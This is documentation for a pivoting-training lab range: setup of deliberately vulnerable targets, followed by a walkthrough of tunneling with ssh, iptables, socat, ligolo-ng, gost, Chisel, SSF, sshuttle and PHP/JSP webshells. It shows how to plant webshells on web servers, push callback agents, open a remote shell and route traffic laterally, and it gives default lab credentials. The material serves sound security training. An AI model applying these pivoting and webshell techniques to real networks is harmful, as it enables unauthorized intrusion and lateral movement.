# Pivot Lab

:::tip Props!

Pivot Lab was created by [CleverNamesTaken](https://github.com/CleverNamesTaken). The content below is a combination of the project README and Conops documents with minor edits.

:::

Project Link: [PivotLab on GitHub](https://github.com/CleverNamesTaken/PivotLab)

This range is intended to be an exercise for cybersecurity professionals to gain exposure to pivoting tools and tradecraft. There are many other tools out there, and this is surely just hitting some of the wavetops for some of the most popular tools.

## Network Topology

The lab consists of two network segments with multiple jump boxes and target machines:

```mermaid
graph TB
    subgraph "VLAN 20 - Management Network<br/>10.X.20.0/24"
        kali["🖥️ Kali Attack Box<br/>10.X.20.201<br/>SSH, Tools"]
        lamp["🌐 LAMP Server<br/>10.X.20.220<br/>Apache, PHP, MySQL"]
        nginx["🌐 Nginx Server<br/>10.X.20.221<br/>Nginx Web Server"]
        tom["☕ Tomcat Server<br/>10.X.20.222<br/>Apache Tomcat, JSP"]
    end
    
    subgraph "VLAN 22 - Target Network<br/>10.X.22.0/24"
        linux["🐧 Linux Target<br/>10.X.22.50<br/>CVE-2025-32433<br/>CVE-2024-47176"]
        windows["🪟 Windows Target<br/>10.X.22.60<br/>CVE-2022-3229<br/>Unified Remote"]
    end
    
    %% Attack paths
    kali -.->|"SSH Access<br/>Pivoting Tools"| lamp
    kali -.->|"SSH Access<br/>Pivoting Tools"| nginx  
    kali -.->|"SSH Access<br/>Pivoting Tools"| tom
    
    lamp -.->|"Pivot To"| linux
    nginx -.->|"Pivot To"| linux
    tom -.->|"Pivot To"| linux
    
    lamp -.->|"Pivot To"| windows
    nginx -.->|"Pivot To"| windows
    tom -.->|"Pivot To"| windows
    
    %% Network separation
    classDef vlan20 fill:#e1f5fe,stroke:#01579b,stroke-width:2px,color:#000000
    classDef vlan22 fill:#fff3e0,stroke:#e65100,stroke-width:2px,color:#000000
    classDef attacker fill:#c8e6c9,stroke:#2e7d32,stroke-width:3px,color:#000000
    classDef target fill:#ffcdd2,stroke:#c62828,stroke-width:3px,color:#000000
    
    class kali attacker
    class lamp,nginx,tom vlan20
    class linux,windows target
```



## About The Project

Broadly speaking, this lab includes the use of three different types of tools:

- live off the land tools
- non-native binaries
- webshells

The lab consists of three jump boxes with different web servers, and two "target" machines for exploitation.  All of the machines except for one of the targets is Debian-based.  The three web servers include a tomcat server for jsp webshells, an apache server for php webshells, and an nginx server.  All of the machines can be administered through the ssh key provided on the kali attack box as the root user, including the two "target" machines.


## Getting Started

This guide assumes the user already has Promox and Ludus installed.

### Installation


1. Clone the repo
   ```sh
   git clone https://github.com/CleverNamesTaken/PivotLab.git
   ```
2. Add the necessary roles
   ```sh
   cd PivotLab
   ludus ansible role add -d roles/attack_box/
   ludus ansible role add -d roles/fvarovillodres.lamp/
   ludus ansible role add -d roles/lamp/
   ludus ansible role add -d roles/linux_target/
   ludus ansible role add -d roles/nginx/
   ludus ansible role add -d roles/tom/
   ludus ansible role add -d roles/tomcat/
   ludus ansible role add -d roles/windows_target/
   ludus ansible role add -d roles/ludus_vulhub/
   ```

3. Import the range config file
   ```sh
   ludus range config set -f range-config.yml
   ```
4. Deploy the range
   ```sh
   ludus range deploy
   ```

## Usage

Feel free to test any number of pivoting tools you'd like.  The `Conops.md` file contains a walkthrough on basic usage of the following tools, which are pre-installed on the Kali attack box at 10.RANGE_NUMBER.20.201:

- ssh
- iptables
- socat
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [gost](https://github.com/ginuerzh/gost)
- [Chisel](https://github.com/jpillora/chisel)
- [SSF](https://securesocketfunneling.github.io/ssf/#home)
- [sshuttle](https://github.com/sshuttle/sshuttle)
- [suo5](https://github.com/zema1/suo5)
- [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)
- [weevely3](https://github.com/epinna/weevely3.git)

ssh to 10.RANGE_NUMBER.20.201 with the credentials `kali:kali`, and check out the `~/tools` directory for pre-installed tools.

If you are like me and prefer your own attack box, then just run `prepareTools.sh` to install the tools on a different platform.

# Range Walkthrough

## Attack box set up

If you'd prefer not to use the provided kali machine, then I'd recommend the following to prepare your machine:
- execute `prepareTools.sh` to download the tools and put them in the same directory structure as provided in this walkthrough.
- You should also grab the private key from the kali machine and copy it into your own `~/.ssh` directory
- run `ludus range etc-hosts` and append the output to your own `/etc/hosts` file

Additionally, wherever you see the term "attackBox" listed in this walkthrough, know that you will have to supply your own attackBox IP address.

## Creds for the range boxes

The ssh key at `/home/kali/.ssh/id_rsa` on the kali machine provides root access to all of the other machines in the network.

Additionally, the `debian` user on all the Linux machines has a password of `debian` and full sudo.

The `root` user on the Windows victim machine has a password of `PivotLab1!`.

## Notation

### Terminal tags

Advanced network operations and use of tunnels often require the use of more than one terminal.  For example, if you want to monitor your callback server while sending an exploit, you would want one terminal for your listener and one terminal for sending your exploit.  These different terminal tags are indicated in these notes by the notation `[[ ToolName~Task ]]`.  Feel free to ignore these, but I have included them to help you understand where to run a command.  I've also annotated when you should create a new terminal by appending an asterisk to the terminal tag like so `[[ ToolName~Task ]]*`.

Whether you use tmux, terminator, zellij, wezterm or something else, I highly recommend some sort of terminal manager to keep your workspace organized.

## Objective

Hit the targets through whatever weird tunnels you like.  The linux target at 10.X.22.50 has a web server that will attempt to call back to you on the IP, port and protocol of your choosing.  If you use the lab-provided kali machine or run the the `prepareTools.sh` script, you will have a bash script called `callMe.sh. in your path that will make the POST request for you.  If you choose not to use script, you can also make the request by visiting `http://10.RANGENUMBER.22.50` in a browser.

As a super lame example with no pivoting, do this:

```
[[ CallMe~Listener ]]*
socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append
```

```
[[ CallMe~Trigger ]]*
lsof -i tcp:4444
	#Make sure your listener is ready to go
cat /tmp/PROOF
	#Should not exist
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
```

## Conops


| Tool        | Live Off the Land | Root required | Platform          | Socks | Tun   | Notes |
| ----------- | ----------------- | ------------- | ----------------- | ----- | ------| -----------------|
| ssh         | true              | false*        | linux/windows     | true  | true* | Bread and butter |
| iptables    | true              | true          | linux             | false | false | Bent pipe or NAT |
| socat       | rarely            | false*        | linux/windows     | false | true* | so many permutations |
| ligolo      | false             | false         | linux/windows     | true  | true  | Latest hotness |
| gost        | false             | false*        | linux/windows     | true  | true  | Huge amount of capabilities |
| Chisel      | false             | false         | linux/windows     | true  | false | Web-based but not a webshell |
| SSF         | false             | false         | linux/windows     | true  | false | like a small implant |
| sshuttle    | true              | false         | linux             | false | false | Simple yet complicated |
| suo5        | false             | false         | php,jsp,aspx,jspx | true  | false | Python client, Chinese webshell |
| Neo-reGeorg | false             | false         | php,aspx          | true  | false | Python client, Chinese webshell, but older |
| weevely3    | false             | false         | php               | false | false | webshell, only http proxying but tons of post-exploitation functionality|

`*` These tools can do pivoting without root privileges, but can be used with greater effectiveness with root privileges or the ability to make iptables rules and allow ip forwarding.


The goal is provide basic functionality of each tool, although there are certainly many more advanced features that will be left to the reader to explore.  Iptables will be an exception -- we will demonstrate simple port forwarding, and then use the nat table for more advanced pivoting as a part of other tools.  If you are unfamiliar with these tools, I suggest doing at least ssh, iptables, and socat, and then jumping around to whatever seems interesting.

## ssh

We will begin with ssh because it is the bread and butter of how Linux systems are administered, and indeed it will be how we move tools around for this lab as well.

I recommend checking out [the Cyber Plumber's Handbook](https://github.com/opsdisk/the_cyber_plumbers_handbook), which has a great deal of excellent information on how to master SSH tunnels.  For basic remembering basic syntax, I recall that the `-L` flag means you are opening a port *L*ocally, whereas `-R` means you are opening a port on the *R*emote host.

We will just cover four features of SSH:

### Modify /etc/ssh/sshd_config

Default sshd configurations may not allow you to proxy through the way that you would like.  Run the following commands as root to do *most* of the forwarding you would need to do with SSH:

```
sed -i 's:GatewayPorts no:GatewayPorts yes:' /etc/ssh/sshd_config
    #This will allow you to use the -R port to open a port on the ssh server that can listen on non-loopback interfaces.
sed -i 's:AllowForwarding no:AllowForwarding yes:' /etc/ssh/sshd_config
    #This will allow you to forward traffic.  If you are not able to forward traffic, you will not be able to pivot with SSH.
```


### ProxyJumps

As described by the man page:

Connect to the target host by first making a ssh connection to the jump host described by destination and then establishing a TCP forwarding to the ultimate destination from there.  Multiple jump hops may be specified separated by comma characters.  

```
[[ SSH~ProxyJump ]]
ssh -J root@tom,root@lamp root@nginx hostname
```

We landed on ngnix through this route:

```
attackBox

-> tom

--> lamp

---> nginx
```

From the perspective of nginx, lamp connected to it.  lamp also does not know about your attackbox, just that tom connected to it.

### Escape Characters ("Konami code")

Prior to initiating an interactive ssh session, add the flag `-o EnableEscapeCommandline=yes` to your command.

Again stealing from the man page:

Currently this allows the addition of port forwardings using the -L, -R and -D options (see above).  It also allows the cancellation of existing port-forwardings with -KL[bind_address:]port for local, -KR[bind_address:]port for remote and -KD[bind_address:]port for dynamic port-forwardings.  

```
[[ SSH~EscapeCharacters ]]*
ssh root@tom -o EnableEscapeCommandline=yes
```

If this fails, check if you are trying to SSH within an SSH session.  Nested SSH sessions means that the terminal will try to do only the first session. 

Then if you realize you need to add more port forwards for the SSH connection instead of closing out the SSH session and starting again, you can drop into a pseudo terminal by typing `<ENTER>~C`.

### tun interface

This requires root access on the client and the server, and the ability to create iptables rules on the server

[This script](https://raw.githubusercontent.com/trustedsec/tap/refs/heads/master/scripts/ssh-tunnel.sh) from TrustedSec used to be able to do this for you, but we are going to do it manually because the script uses deprecated Linux commands that you won't likely find on modern Linux systems.

#### Prepare server

##### Check sshd config

The server must allow tunnels.  We will check if it does, and then modify it if it does not.

```
[[ SSH~Tun ]]*
ssh root@lamp "grep PermitTunnel /etc/ssh/sshd_config"
    #If it is commented out or says no, then we need to modify this configuration
ssh root@lamp "sed -i 's:#PermitTunnel no:PermitTunnel yes:' /etc/ssh/sshd_config"
ssh root@lamp "systemctl reload sshd"
ssh root@lamp "grep PermitTunnel /etc/ssh/sshd_config"
```
	
##### Create the tun interface

```
[[ SSH~Tun ]]
ssh root@lamp "ip a" | grep tun
    #If we don't have any tun interfaces, then we will create tun0.  If we do have some tun interfaces, another number and remember it
    #For this exercise, we assume there is no tun interface already and so select tun0
ssh root@lamp "ip tuntap add dev tun0 mode tun"
ssh root@lamp "ip address add 192.168.37.2/30 dev tun0"
ssh root@lamp "ip link set tun0 up"
ssh root@lamp "ip a" | grep tun
```

#### Prepare the client

```
[[ SSH~Tun ]]
ip a | grep tun
    #Similar to on the server, we select a tun number that does not already exist.  Assume no tun interface already exists, we pick tun0
sudo su
ip tuntap add dev tun0 mode tun 
ip address add 192.168.37.1/30 dev tun0
    #We picked another address within the same subnet as the one we assigned for the tun interface on the server
ip link set tun0 up
ip a
ssh -Nf -w0:0 root@lamp
    #In this example, we did 0:0 because we connected tun0 from the local side to tun0 on the remote side.  Adjust accordingly
    Also, keep track of this PID, because you will need it to close 
echo $! |tee /tmp/tun.pid
    #We need to store the PID of this tunnel to close it later.

ping -c1 192.168.37.2
    #If this succeeds, it means we have tunneled ICMP through an SSH tunnel.
```

### Prepare forwarding

```
[[ SSH~Tun ]]
ssh root@lamp "sysctl net.ipv4.ip_forward"
	#If this value = 0, then we need to set it to 1 to allow us to use the server as a router
	ssh root@lamp "sysctl -w net.ipv4.ip_forward=1"

ssh root@lamp "iptables -t nat -I POSTROUTING -s 192.168.37.1 -j MASQUERADE"
ssh root@lamp "iptables -I FORWARD --src 192.168.37.1 -j ACCEPT"

ip route add 10.X.22.0/24 via 192.168.37.2 dev tun0
```

### Test our forwarding

```
[[ SSH~Tun ]]
lsof -i tcp:4444
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
    #If all has gone well, then the linux machine believes lamp made the request 
```

### Clean up routing, iptables, and tun interface

This cleanup does not include the configuration changes to net.ipv4.ip_forwarding or sshd_config, but at least will remove the routing and tun interfaces to avoid interfering with other exercises.

```
[[ SSH~Tun ]]
ip route del 10.X.22.0/24 via 192.168.37.2 dev tun0
kill -9 $(cat /tmp/tun.pid)
ip tuntap del dev tun0 mode tun 

ssh root@lamp "iptables -t nat -D POSTROUTING -s 192.168.37.1 -j MASQUERADE"
ssh root@lamp "iptables -D FORWARD -s 192.168.37.1 -j ACCEPT"
ssh root@lamp "ip tuntap del dev tun0 mode tun"
ssh root@lamp "ip a" | grep tun
```

## iptables

We just got into some iptables voodo, so let's take a look at that closer.

### Bent pipe

In this example, we have simple bent pipe redirection using DNAT and MASQUERADE rules on the nat table.

```
[[ IpTables~BentPipe ]]*
ssh root@tom "iptables -t nat -I PREROUTING -p tcp --dport 4022 -j DNAT --to-destination 10.X.20.221:22"
ssh root@tom "iptables -I FORWARD -p tcp --dport 4022 -j ACCEPT"
ssh root@tom "iptables -t nat -I POSTROUTING -p tcp --dst 10.X.20.221 --dport 22 -j MASQUERADE"
ssh root@tom "sysctl -w net.ipv4.ip_forward=1"
ssh -p 4022 root@tom hostname
	#Notice we are on nginx instead of tom
```

### Weak port stealing

The concept here is to avoid opening up new ports, but being able to access new resources.  In this example, we will write some iptables rules to allow us to connect to lamp through an ssh connection to tom based on a source port number.  In practice, this may not work depending on NATing, but iptables can filter in all sorts of ways, so more slick methods are also available.

```
[[ IpTables~PortStealing ]]*
ssh root@tom 'iptables -t nat -I PREROUTING -p tcp --sport 12345 --dport 22 -j DNAT --to-destination 10.X.20.221:22'
ssh root@tom 'iptables -t nat -I POSTROUTING -p tcp --sport 12345 -j MASQUERADE'
ssh root@tom 'sysctl -w net.ipv4.ip_forward=1'

socat tcp-listen:5055,fork,reuseaddr TCP-connect:tom:22,sourceport=12345 &
	#This command will open up port 5055 and bend incoming traffic to nginx on port 22 with a sourceport of 12345
	#The iptables rules we have set up matches on the destination port and sends it off to lamp

ssh -p 5055 root@127.0.0.1 hostname
```

## socat

In this section, we will look at some other ways we can use socat for pivoting, omitting a huge amount of the other awesomeness of possibilities.

### Creating certificates

First we have to start off with generating certificates, because we do not like to send out unencrypted traffic.

```
[[ Socat~certs ]]*
mkdir -p tools/socat
cd tools/socat
openssl genrsa -out server.key 2048
openssl req -new -key server.key -x509 -days 365 -out server.crt -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'
cat server.key server.crt > server.pem
chmod 0600 server.pem server.key
scp server.crt root@nginx:
scp server.pem root@nginx:
```

### Remote port forwarding

Next we will start the remote socat listener.  We listen for a callback on nginx on port 2010, and then we will callback to our attack machine on an encrypted tcp port 4444.

```
[[ Socat~RemoteForward ]]*
ssh root@nginx socat -d -d tcp-listen:2010,fork,reuseaddr openssl-connect:<ATTACK_BOX_IP>:4444,cert=server.pem,cafile=server.crt,verify=0
```

Now we set up an encrypted listener on port 8888, and relay the traffic to out PROOF file.

```
[[ Socat~Listener ]]*
cd tools/socat
socat -d -u openssl-listen:4444,reuseaddr,fork,cert=server.pem,cafile=server.crt open:/tmp/PROOF,create,append
    #if this fails, probably need to kill what else is listening on port 4444
    pkill socat
```

Last, we make a call to the linux target to callback to nginx, then check our proof file to ensure we got the callback.

```
[[ Socat~Call ]]*
lsof -i tcp:4444
cat /tmp/PROOF
callMe.sh linux 80 nginx 2010 tcp
cat /tmp/PROOF
	#Now we have a callback that we caught on nginx
```

Now clean up

```
[[ Socat~Call ]]*
pkill socat
ssh root@nginx pkill socat
```

### Local port forwarding

Now we want to forward traffic from a local port so that it reaches the target

```
[[ Socat~Listener ]]
socat -d -d TCP-LISTEN:9999,fork,reuseaddr OPENSSL-CONNECT:nginx:3030,cert=server.pem,cafile=server.pem,verify=0
```


```
[[ Socat~RemoteForward ]]
ssh root@nginx socat -d -d OPENSSL-LISTEN:3030,cert=server.pem,cafile=server.crt,verify=0 tcp-connect:linux:80
```


```
[[ Socat~Call ]]
lsof -i tcp:9999
	#check to make sure our local port forward is ready
lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
	#check to make sure catcher is ready
cat /tmp/PROOF
callMe.sh 127.0.0.1 9999 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
	#notice a request from nginx, even though we sent the request to loopback on port 9999.
```


### tun interface

First we setup a tls server

```
[[ Socat~Listener ]]
sudo socat -d -d OPENSSL-LISTEN:8888,fork,reuseaddr,cert=server.pem,cafile=server.pem,verify=1 TUN:10.13.37.2/30,up
```

Next we call into that server

```
[[ Socat~RemoteForward ]]
ssh root@nginx 'socat -d -d openssl-connect:<ATTACK_BOX_IP>:8888,cert=server.pem,cafile=server.crt,verify=0 TUN:10.13.37.1/30,up'
```

After calling in, we have a tun interface on each machine that can communicate with each other over tcp/udp/icmp/other layer three protocols.
```
[[ Socat~Call ]]
ip a
ping -c 1 10.13.37.1
```

Now that we have our tun interface, we have to set up our iptables and routing as we did for the ssh tun interface.

## ligolo

### First agent

#### Start server

```
[[ Ligolo~Server ]]*
cd tools/ligolo-ng
sudo ./proxy -selfcert
certificate_fingerprint
	#Hold onto this fingerprint, you will need it in a second
interface_create --name ligolo
```

#### Call back in with client

```
[[ Ligolo~Client ]]*
cd tools/ligolo-ng
scp agent root@lamp:
ssh root@lamp 'chmod +x agent'
ssh root@lamp './agent -connect <ATTACK_BOX_IP>:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>'
```

### Tun interface

#### Add route

```
[[ Ligolo~Server ]]
session
1
route_add --name ligolo --route 10.X.22.0/24
start
```

#### Call me

Notice in this iteration we use a udp listener instead of tcp.  Originally I tried a tcp listener, but my callback connection would timeout.  I am not sure why, but I only saw this with ligolo.

```
[[ Ligolo~Callme ]]*
lsof -i udp:4444
	socat -u udp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 udp
cat /tmp/PROOF
```

### Double hop

Using our existing agent, let's grab another one to access a third machine

#### Create route

```
[[ Ligolo~Server ]]
route_add --name ligolo --route 10.X.20.221/32

```
#### Start listener

```
[[ Ligolo~Server ]]
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
	#Notice we use 11601 because this is the listener we started the ligolo server with
```

#### Push and execute binary

```
[[ Ligolo~SecondAgent ]]*
cd tools/ligolo-ng
	#Let us double-check that we are trying to access nginx using our ligolo interface
ip route get 10.X.20.221
scp agent root@nginx:
ssh root@nginx 'chmod +x agent'
ssh root@nginx './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>'
```

#### Use the second agent

```
[[ Ligolo~Server ]]
	#From our first session, we stop the tunnel
stop
	#Next we move to our new session
session
    #Pick the new session
	#And restart the tunnel
start
```

#### Call in from second agent

Lets try to initiate a callback again to make sure we are calling from nginx instead of lamp.

```
[[ Ligolo~Callme ]]
lsof -i udp:4444
	socat -u udp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 udp
cat /tmp/PROOF
```

#### Clean up

```
[[ Ligolo~Server ]]
interface_list
interface_delete --name ligolo
interface_list
exit
```

## gost


Gost is probably the easiest way to just throw up a binary and have it start doing socks proxying, but it is also like socat in the amount of strange combinations of things that it can do. Let's just do a smattering of the possibilities.

### simple socks

```
[[ gost~Kali ]]*
cd tools/gost
scp gost root@tom:
ssh root@tom "./gost -L=socks://:6121" &
lsof -i tcp:9050
./gost -L=:9050 -F=socks://tom:6121 &
lsof -i tcp:9050
	#If both ends are gosts (as example above), the data transfer will be encrypted (using tls or tls-auth). Otherwise, use standard SOCKS5 for communication (no-auth or user/pass).

sudo sed -i 's:socks4:socks5:' /etc/proxychains4.conf
tail /etc/proxychains4.conf
	#make sure it says socks5 127.0.0.1 9050

lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
	#Notice we got a callback through our socks proxy
```

#### Clean up

```
[[ gost~Kali ]]
pkill socat
pkill gost
ssh root@tom 'pkill gost'
```

### Tun interface

```
[[ gost~Kali ]]
	#Create the tun interface on the server
ssh root@tom './gost -L="tun://:8421?net=192.168.123.1/24&route=10.X.22.0/24"' &

	#Create the tun interface on the client
sudo ./gost -L="tun://:8421/tom:8421?net=192.168.123.2/24&gw=192.168.123.1&route=10.X.22.0/24" &
	#try to ping the other side of the tun interface
ping 192.168.123.1 -c 1

lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
```

#### Prepare iptables rules and forwarding

Now that we have our tun interface, we have to set up our iptables and routing as we did for the ssh tun interface.

```
ssh root@tom 'sysctl -w net.ipv4.ip_forward=1'
ssh root@tom 'iptables -t nat -I POSTROUTING -s 192.168.123.0/24 ! -o tun0 -j MASQUERADE'
ssh root@tom "iptables -I FORWARD --src 192.168.123.2 -j ACCEPT"
```


#### Clean up

```
[[ gost~Kali ]]
sudo pkill gost
ssh root@tom 'pkill gost'
ssh root@tom 'iptables -t nat -D POSTROUTING -s 192.168.123.0/24 ! -o tun0 -j MASQUERADE'
ssh root@tom "iptables -D FORWARD --src 192.168.123.2 -j ACCEPT"
```

### kcp socks

Gost offers the ability to tunnel traffic through some interesting channels like [kcp](https://github.com/skywind3000/kcp/blob/master/README.en.md), QUIC (quic), shadowsocks (ss), web sockets (wss), and others.


```
ssh root@tom "./gost -L socks5+kcp://:8443" &
lsof -i tcp:9050
./gost -L=:9050 -F=socks5+kcp://tom:8443 &
lsof -i tcp:9050
lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
```

#### Clean up

```
pkill gost
ssh root@tom 'pkill gost'
```

### Chisel

#### Build and push your binaries

```
[[ Chisel~Compiling ]]*
cd tools/chisel
go mod vendor
go build -ldflags "-s -w"
env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w"
scp chisel root@tom:
ssh root@tom chmod +x ./chisel
```


#### Socks

```
[[ Chisel~Socks ]]*
ssh root@tom chmod +x ./chisel
ssh root@tom ss -punta
	#Do we already see a webserver here?  We can have chisel pretend to be this webserver with the `--backend` flag
ssh root@tom ./chisel server --backend http://127.0.0.1:8080 --socks5 --reverse --port 80 &
ssh root@tom ss -punta | grep 80
```

```
[[ Chisel~Callback ]]*
curl tom
curl tom:8080
	#The pages look the same right?  That is the --backend flag doing what it does.  If you have root access on the machine, it would be even better to move the legit webserver to only listen on loopback, and then have chisel listen on the public-facing interface.

lsof -i tcp:9050
	#Check to see that we don't have anything listening on port 9050
~/tools/chisel/chisel client tom:80 9050:socks &
lsof -i tcp:9050
	#Check to see that we have chisel listening on 9050

	#Fix up proxychains.conf if we haven't already
sudo sed -i 's:socks4:socks5:' /etc/proxychains4.conf

lsof -i tcp:4444
	#Check to make sure we have a listener ready.  If not, get it started:
	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
proxychains4 -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
	#Hopefully we got our callback and see a new entry in /tmp/PROOF
```

#### Local port forward

```
[[ Chisel~LocalForward ]]*
lsof -i tcp:9999
~/tools/chisel/chisel client tom:80 9999:linux:80 &
lsof -i tcp:9999
```

```
[[ Chisel~Callback ]]
lsof -i tcp:4444
	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh 127.0.0.1 9999 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
```

#### Remote port forward

```
[[ Chisel~RemoteForward ]]*
ssh root@tom ss -punta | grep 8888
	#check to see if the port is open
~/tools/chisel/chisel client tom:80 R:8888:127.0.0.1:4444 &
ssh root@tom ss -punta | grep 8888
	#check to see if the port is open again
```

```
[[ Chisel~Callback ]]
lsof -i tcp:4444
	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh linux 80 tom 8888 tcp
cat /tmp/PROOF
```

#### Clean up all the chisels

```
pkill chisel
ssh root@tom pkill chisel
```

### SSF

```
[[ SSF~Prep ]]*
cd tools/ssf/ssf-linux-x86_64-3.0.0
```

#### modify config.json file

##### Create your own certs

```
[[ SSF~Prep ]]
openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'


openssl rsa -in private.key -out private.key -aes256 -passout pass:passphrase

openssl dhparam -dsaparam -out dh4096.pem 4096 #[] add this line

openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'


cat << EOF > extfile.txt
[ v3_req_p ]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment

[ v3_ca_p ]
basicConstraints = CA:TRUE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment, keyCertSign
EOF

openssl req -newkey rsa:4096 -nodes -keyout ca_int.key -out ca_int.csr -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'

openssl x509 -extfile extfile.txt -extensions v3_ca_p -req -sha1 -days 3650 -CA ca.crt -CAkey ca.key -CAcreateserial -in ca_int.csr -out ca_int.crt
cat ca.crt >> ca_int.crt

openssl x509 -extfile extfile.txt -extensions v3_req_p -req -sha1 -days 3650 -CA ca.crt -CAkey ca.key -CAcreateserial -in certificate.csr -out certificate.crt
cat ca.crt >> certificate.crt

cp ../config.json .
sed -i 's:_path:_buffer:' config.json
CA_CERT=$(sed ':a;N;$!ba;s/\n/\\\\n/g' certs/trusted/ca.crt)
CERT=$(sed ':a;N;$!ba;s/\n/\\\\n/g' certs/certificate.crt)
KEY=$(sed ':a;N;$!ba;s/\n/\\\\n/g' certs/private.key)
DH=$(sed ':a;N;$!ba;s/\n/\\\\n/g' certs/dh4096.pem)

sed -i 's#|C:\\\\windows\\\\system32\\\\cmd.exe##' config.json
sed -i 's:false:true:' config.json
sed -i "s:./certs/trusted/ca.crt:$CA_CERT:" config.json
sed -i "s:./certs/certificate.crt:$CERT:" config.json
sed -i "s:./certs/private.key:$KEY:" config.json
sed -i "s:./certs/dh4096.pem:$DH:" config.json
```

#### push files and execute

```
[[ SSF~Server ]]*
cd tools/ssf/ssf-linux-x86_64-3.0.0
scp ssfd config.json root@lamp:
ssh root@lamp ./ssfd --gateway-ports
```

```
[[ SSF~Client ]]*
cd tools/ssf/ssf-linux-x86_64-3.0.0
./ssf lamp --socks 9050 --remote-tcp-forward 0.0.0.0:4444:127.0.0.1:4444 --shell 5555 
    #This command is doing a lot -- we created a socks proxy through lamp on 9050, we opened up port 4444 on lamp to forward to localhost 4444, and opened up 5555 locally for a shell on lamp
```

```
[[ SSF~CallMe ]]*
lsof -i tcp:9050
lsof -i tcp:4444
    #If this fails, then we need to start up our listener again
    socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &

ssh root@lamp ss -punta
cat /tmp/PROOF
proxychains4 -q callMe.sh linux 80 10.2.20.220 4444 tcp
cat /tmp/PROOF

    #Lets also grab a shell from this server
lsof -i tcp:5555
nc 127.0.0.1 5555
```


#### clean up

```
[[ SSF~CallMe ]]
pkill ssf
ssh root@lamp pkill ssfd
```

## sshuttle

While I think sshuttle is a cool tool, I do not understand all the networking going on under the hood and tools that make changes to my iptables rules makes me uncomfortable.  The benefits of this tool is its simplicity in use, and its small presence on the device to pivot through -- you just need an ssh connection and python on the box.  The major drawback is that if it does not work, it will be painful to troubleshoot.

```
[[ sshuttle~connect ]]*
sudo sshuttle --remote root@tom 10.X.22.0/24  --daemon
	#The third octet for the target machines is 22, so this will only tunnel traffic meant for the target through the sshuttle tunnel.
	#Also note that we are using root, but you do not need root access for this to work
yes

	#Notice sshuttle changes our iptables rules.  I do not enjoy this.
sudo iptables -t nat -nvL

lsof -i tcp:4444
	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
cat /tmp/PROOF
callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
```

### clean up sshuttle

```
[[ sshuttle~connect ]]
sudo pkill sshuttle
sudo iptables -t nat -nvL
```

## suo5

```
[[ SUO5~Demo ]]*
cd tools/suo5
cat assets/java/suo5.jsp | ssh root@tom "cat - | sudo tee /usr/share/tomcat/webapps/ROOT/suo5.jsp"
chmod +x suo5-linux-amd64
./suo5-linux-amd64 -t http://tom:8080/suo5.jsp
```

```
[[ SUO5~CallMe ]]*
sudo sed -i '/^socks/Ic\socks5 127.0.0.1 1111' /etc/proxychains4.conf
tail /etc/proxychains4.conf
	#make sure it says socks5 127.0.0.1 9050

lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &

cat /tmp/PROOF
proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
cat /tmp/PROOF
	#Notice we got a callback through our socks proxy
```


## Neo-reGeorg

```
[[ NeoreGeorg~Demo ]]*
cd tools/Neo-reGeorg
./neoreg.py generate -k password
cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@lamp 'cat - |sudo tee /var/www/html/tunnel.php'

./neoreg.py -k password -u http://lamp/tunnel.php --php -vvv
```

```
[[ NeoreGeorg~CallMe ]]*
sudo sed -i '/^socks/Ic\socks5 127.0.0.1 1080' /etc/proxychains4.conf
tail /etc/proxychains4.conf
	#make sure it says socks5 127.0.0.1 1080

lsof -i tcp:4444
	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &

